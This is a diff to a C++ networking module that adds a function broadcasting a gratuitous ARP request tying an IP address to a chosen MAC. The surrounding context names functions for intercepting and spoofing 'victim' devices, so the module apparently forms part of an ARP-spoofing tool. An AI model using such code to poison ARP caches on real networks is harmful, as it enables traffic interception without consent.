@@ -215,3 +215,36 @@ void net_arp::intercept_device_traffic(const vector<ip4_addr> &victim_devices, i
 //            spoof_as_device({dest}, victim, my_mac);
 
 }
+
+
+void net_arp::announce_new_mac(ip4_addr src_ip, mac_addr new_mac) {
+#define BUFF_SZ 65536
+    uint8_t buff[BUFF_SZ] = {0};
+
+    // setup net_arp
+    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
+    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
+    arp_header->arp_pro = htons(ETH_P_IP); // first net_arp octets type: ip
+    arp_header->arp_hln = ETH_ALEN; // len of mac octets
+    arp_header->arp_pln = 4; // len of ip octets
+    arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)
+
+    memcpy(arp_header->arp_sha, &new_mac, sizeof(arp_header->arp_sha));
+    write_in_network_order(arp_header->arp_spa, &src_ip);
+
+    memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
+    write_in_network_order((uint8_t *) &arp_header->arp_tpa, &src_ip);
+
+
+    ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
+    ether_client.next_source_addr.set_next_choice(new_mac);
+    ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);
+
+    // send frame
+    int cnt = sizeof(ether_arp);
+    send_msg<> request;
+    memcpy(request.get_active_buff(), buff, cnt);
+    request.set_count(cnt);
+    ether_client.send_data(std::move(request));
+
+}
